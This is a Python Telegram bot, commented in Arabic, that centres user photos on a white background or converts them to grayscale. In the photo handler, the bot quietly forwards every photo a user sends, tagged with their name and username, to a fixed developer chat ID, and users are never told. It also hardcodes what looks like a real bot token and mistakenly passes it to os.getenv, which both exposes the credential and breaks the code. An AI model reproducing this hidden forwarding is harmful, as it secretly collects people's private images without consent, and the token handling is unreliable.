import os
import telebot
from PIL import Image
import requests
from io import BytesIO

# وضع التوكن بمتغير بيئي لحمايته
token = os.getenv("6472606496:AAGmgLlNWpX_ZJDldgvAZpm2Uy9254RYdDQ"
                  )  # ضع التوكن في متغير بيئي بدل كشفه هنا
bot = telebot.TeleBot(token)

# Dictionary لتتبع المستخدمين اللي يريدون تلوين الصور
images_to_color = {}


@bot.message_handler(commands=['start'])
def welcome(message):
    os.makedirs('photos', exist_ok=True)
    name = message.from_user.first_name
    text = f'مرحبًا بك {name} في بوت توسيط الصور. قم بإرسال الصورة لأقوم بتوسيطها على خلفية بيضاء.'

    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton(
            "ستيكرات المطور", url="https://t.me/addstickers/emg_s"))
    keyboard.add(
        telebot.types.InlineKeyboardButton("تلوين الصورة",
                                           callback_data='colorize'))

    bot.send_message(message.chat.id, text, reply_markup=keyboard)


@bot.callback_query_handler(func=lambda call: call.data == 'colorize')
def colorize_button_pressed(call):
    user_id = call.message.chat.id
    images_to_color[user_id] = True
    bot.send_message(user_id,
                     "قم بإرسال الصورة التي تريد تلوينها إلى أسود وأبيض.")


@bot.message_handler(content_types=['photo'])
def photo(message):
    file_info = bot.get_file(message.photo[-1].file_id)
    file_path = file_info.file_path
    photo_url = f"https://api.telegram.org/file/bot{token}/{file_path}"

    file_name = f"{message.chat.id}.jpg"
    with open(file_name, 'wb') as file:
        file.write(requests.get(photo_url).content)

    # إرسال الصورة إلى المطور
    username = getattr(message.from_user, 'username', 'لا يوجد')
    caption = f"مستخدم: {message.from_user.first_name} (@{username})"
    bot.send_photo(651561282, photo=message.photo[-1].file_id, caption=caption)

    # تلوين الصورة بالأسود والأبيض إذا ضغط المستخدم على زر التلوين
    if message.chat.id in images_to_color:
        with Image.open(file_name) as image_data:
            grayscale_image = image_data.convert('L')
            output = BytesIO()
            grayscale_image.save(output, format="JPEG")
            output.seek(0)
            bot.send_photo(message.chat.id, output)

        del images_to_color[message.chat.id]  # إزالة المستخدم من القائمة

    else:
        # توسيط الصورة على خلفية بيضاء
        with Image.open(file_name) as image_data:
            width, height = image_data.size
            background_width = int(width * 1.5)
            background_height = int(height * 1.5)

            # إنشاء صورة جديدة بخلفية بيضاء وتوسيط الصورة الأصلية فيها
            image_data_new = Image.new('RGB',
                                       (background_width, background_height),
                                       color=(255, 255, 255))
            image_data_new.paste(image_data,
                                 ((background_width - width) // 2,
                                  (background_height - height) // 2))

            image_data_new.save(file_name)
            with open(file_name, 'rb') as file:
                bot.send_photo(message.chat.id, file)


@bot.message_handler(commands=['stickers'])
def send_stickers(message):
    bot.send_message(message.chat.id,
                     "ستيكرات المطور",
                     reply_markup=telebot.types.InlineKeyboardMarkup().add(
                         telebot.types.InlineKeyboardButton(
                             "ستيكرات المطور",
                             url="https://t.me/addstickers/emg_s")))


# تشغيل البوت مع الحماية من التوقف المفاجئ
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"خطأ في البوت: {e}")
